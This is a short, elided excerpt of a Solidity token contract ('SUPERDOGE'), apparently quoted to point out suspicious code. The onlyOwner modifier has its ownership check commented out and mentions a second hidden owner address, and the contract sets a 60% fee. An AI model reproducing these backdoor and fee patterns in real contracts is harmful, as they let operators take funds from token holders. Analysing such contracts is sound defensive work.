...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        //require(_msgSender()   ==  ownerAdd || _owner == _msgSender(), "Ownable: caller is not the owner"); 代理
        _;
    }
...
contract SUPERDOGE is Context, IERC20, Ownable {
    ...
    uint256 public footlistedFee = 60;
